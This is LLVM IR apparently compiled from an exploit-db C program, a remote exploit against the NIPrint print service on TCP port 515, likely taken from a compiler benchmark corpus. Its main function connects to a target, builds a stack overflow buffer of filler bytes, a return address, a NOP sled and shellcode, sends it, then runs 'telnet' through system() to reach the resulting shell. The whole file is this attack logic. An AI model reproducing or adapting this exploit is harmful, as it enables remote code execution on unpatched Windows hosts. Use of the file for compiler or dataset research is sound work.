; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/windows/remote/extr_116.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/windows/remote/extr_116.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.sockaddr_in = type { i8*, i32, %struct.TYPE_2__, i32 }
%struct.TYPE_2__ = type { i32 }
%struct.sockaddr = type { i32 }

@.str = private unnamed_addr constant [21 x i8] c"Usage: %s <address>\0A\00", align 1
@PF_INET = common dso_local global i32 0, align 4
@SOCK_STREAM = common dso_local global i32 0, align 4
@.str.1 = private unnamed_addr constant [26 x i8] c"[+] Connected to %s:515!\0A\00", align 1
@RET = common dso_local global i64 0, align 8
@shellcode = common dso_local global i8* null, align 8
@.str.2 = private unnamed_addr constant [28 x i8] c"[+] Exploit code was sent!\0A\00", align 1
@.str.3 = private unnamed_addr constant [25 x i8] c"[+] Connecting to %s:%d\0A\00", align 1
@SHELL = common dso_local global i32 0, align 4
@.str.4 = private unnamed_addr constant [14 x i8] c"telnet %s %d\0A\00", align 1
@.str.5 = private unnamed_addr constant [53 x i8] c"[-] Not connected! NIPrint probably not vulnerable!\0A\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca i32, align 4
  %7 = alloca %struct.sockaddr_in, align 8
  %8 = alloca [2000 x i8], align 16
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  %9 = load i8**, i8*** %5, align 8
  %10 = getelementptr inbounds i8*, i8** %9, i64 1
  %11 = load i8*, i8** %10, align 8
  %12 = icmp ne i8* %11, null
  br i1 %12, label %19, label %13

13:                                               ; preds = %2
  %14 = load i8**, i8*** %5, align 8
  %15 = getelementptr inbounds i8*, i8** %14, i64 0
  %16 = load i8*, i8** %15, align 8
  %17 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str, i64 0, i64 0), i8* %16)
  %18 = call i32 @exit(i32 0) #3
  unreachable

19:                                               ; preds = %2
  %20 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %7, i32 0, i32 0
  %21 = load i8*, i8** %20, align 8
  %22 = call i32 @memset(i8* %21, i32 0, i32 8)
  %23 = load i32, i32* @PF_INET, align 4
  %24 = load i32, i32* @SOCK_STREAM, align 4
  %25 = call i32 @socket(i32 %23, i32 %24, i32 0)
  store i32 %25, i32* %6, align 4
  %26 = load i32, i32* @PF_INET, align 4
  %27 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %7, i32 0, i32 3
  store i32 %26, i32* %27, align 8
  %28 = load i8**, i8*** %5, align 8
  %29 = getelementptr inbounds i8*, i8** %28, i64 1
  %30 = load i8*, i8** %29, align 8
  %31 = call i32 @getip(i8* %30)
  %32 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %7, i32 0, i32 2
  %33 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %32, i32 0, i32 0
  store i32 %31, i32* %33, align 4
  %34 = call i32 @htons(i32 515)
  %35 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %7, i32 0, i32 1
  store i32 %34, i32* %35, align 8
  %36 = load i32, i32* %6, align 4
  %37 = bitcast %struct.sockaddr_in* %7 to %struct.sockaddr*
  %38 = call i32 @connect(i32 %36, %struct.sockaddr* %37, i32 24)
  %39 = icmp sgt i32 %38, -1
  br i1 %39, label %40, label %75

40:                                               ; preds = %19
  %41 = load i8**, i8*** %5, align 8
  %42 = getelementptr inbounds i8*, i8** %41, i64 1
  %43 = load i8*, i8** %42, align 8
  %44 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([26 x i8], [26 x i8]* @.str.1, i64 0, i64 0), i8* %43)
  %45 = getelementptr inbounds [2000 x i8], [2000 x i8]* %8, i64 0, i64 0
  %46 = call i32 @memset(i8* %45, i32 0, i32 2000)
  %47 = getelementptr inbounds [2000 x i8], [2000 x i8]* %8, i64 0, i64 0
  %48 = call i32 @memset(i8* %47, i32 65, i32 49)
  %49 = load i64, i64* @RET, align 8
  %50 = getelementptr inbounds [2000 x i8], [2000 x i8]* %8, i64 0, i64 0
  %51 = call i32 @strlen(i8* %50)
  %52 = sext i32 %51 to i64
  %53 = getelementptr inbounds [2000 x i8], [2000 x i8]* %8, i64 0, i64 %52
  %54 = bitcast i8* %53 to i64*
  store i64 %49, i64* %54, align 1
  %55 = getelementptr inbounds [2000 x i8], [2000 x i8]* %8, i64 0, i64 0
  %56 = getelementptr inbounds [2000 x i8], [2000 x i8]* %8, i64 0, i64 0
  %57 = call i32 @strlen(i8* %56)
  %58 = sext i32 %57 to i64
  %59 = getelementptr inbounds i8, i8* %55, i64 %58
  %60 = call i32 @memset(i8* %59, i32 144, i32 50)
  %61 = getelementptr inbounds [2000 x i8], [2000 x i8]* %8, i64 0, i64 0
  %62 = getelementptr inbounds [2000 x i8], [2000 x i8]* %8, i64 0, i64 0
  %63 = call i32 @strlen(i8* %62)
  %64 = sext i32 %63 to i64
  %65 = getelementptr inbounds i8, i8* %61, i64 %64
  %66 = load i8*, i8** @shellcode, align 8
  %67 = call i32 @strlen(i8* %66)
  %68 = call i32 @memcpy(i8* %65, i8** @shellcode, i32 %67)
  %69 = load i32, i32* %6, align 4
  %70 = getelementptr inbounds [2000 x i8], [2000 x i8]* %8, i64 0, i64 0
  %71 = getelementptr inbounds [2000 x i8], [2000 x i8]* %8, i64 0, i64 0
  %72 = call i32 @strlen(i8* %71)
  %73 = call i32 @send(i32 %69, i8* %70, i32 %72, i32 0)
  %74 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([28 x i8], [28 x i8]* @.str.2, i64 0, i64 0))
  br label %75

75:                                               ; preds = %40, %19
  %76 = load i32, i32* %6, align 4
  %77 = call i32 @close(i32 %76)
  %78 = load i8**, i8*** %5, align 8
  %79 = getelementptr inbounds i8*, i8** %78, i64 1
  %80 = load i8*, i8** %79, align 8
  %81 = load i32, i32* @SHELL, align 4
  %82 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([25 x i8], [25 x i8]* @.str.3, i64 0, i64 0), i8* %80, i32 %81)
  %83 = getelementptr inbounds [2000 x i8], [2000 x i8]* %8, i64 0, i64 0
  %84 = load i8**, i8*** %5, align 8
  %85 = getelementptr inbounds i8*, i8** %84, i64 1
  %86 = load i8*, i8** %85, align 8
  %87 = load i32, i32* @SHELL, align 4
  %88 = call i32 @sprintf(i8* %83, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.4, i64 0, i64 0), i8* %86, i32 %87)
  %89 = getelementptr inbounds [2000 x i8], [2000 x i8]* %8, i64 0, i64 0
  %90 = call i32 @system(i8* %89)
  %91 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([53 x i8], [53 x i8]* @.str.5, i64 0, i64 0))
  ret i32 0
}

declare dso_local i32 @printf(i8*, ...) #1

; Function Attrs: noreturn
declare dso_local i32 @exit(i32) #2

declare dso_local i32 @memset(i8*, i32, i32) #1

declare dso_local i32 @socket(i32, i32, i32) #1

declare dso_local i32 @getip(i8*) #1

declare dso_local i32 @htons(i32) #1

declare dso_local i32 @connect(i32, %struct.sockaddr*, i32) #1

declare dso_local i32 @strlen(i8*) #1

declare dso_local i32 @memcpy(i8*, i8**, i32) #1

declare dso_local i32 @send(i32, i8*, i32, i32) #1

declare dso_local i32 @close(i32) #1

declare dso_local i32 @sprintf(i8*, i8*, i8*, i32) #1

declare dso_local i32 @system(i8*) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { noreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
